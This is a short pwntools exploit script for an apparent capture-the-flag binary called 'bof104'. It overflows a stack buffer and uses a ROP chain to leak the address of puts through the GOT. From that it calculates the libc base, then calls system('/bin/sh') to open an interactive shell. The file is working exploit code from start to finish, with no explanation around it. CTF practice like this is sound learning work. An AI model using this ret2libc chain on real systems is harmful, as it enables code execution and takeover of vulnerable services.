from pwn import *
context.arch = "amd64"
#r = remote("bof104.sstf.site", 1337)
r = process("./bof104_patched")
libc = ELF("libc.so.6")
e = ELF("bof104")
# Leak
rop = ROP(e)
rop.puts(e.got["puts"])
rop.bofme()
r.sendline(b"A" * 0x20 + b"BBBBBBBB" + rop.chain())
r.recvline()
leak_address = u64(r.recvline()[:-1].ljust(8, b"\x00")) 
libc.address = leak_address - libc.symbols["puts"]
binsh_ptr = next(libc.search(b"/bin/sh\x00"))
# Get shell
rop = ROP(libc)
rop.raw(rop.ret)
rop.system(binsh_ptr)
print(rop.system(binsh_ptr))
r.sendline(b"A" * 0x20 + b"BBBBBBBB" + rop.chain())
r.interactive()